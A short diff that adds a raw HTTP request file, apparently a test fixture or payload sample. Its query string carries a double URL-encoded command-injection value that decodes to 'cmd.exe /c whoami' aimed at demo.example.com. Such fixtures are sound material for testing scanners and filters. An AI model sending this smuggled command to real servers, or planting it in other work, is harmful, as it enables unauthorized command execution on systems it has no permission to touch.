@@ -1,0 +1,4 @@
+GET /a?s=d%253Dcmd.exe%2B%252Fc%2Bwhoami HTTP/1.1
+Host: demo.example.com
+Connection: close
+
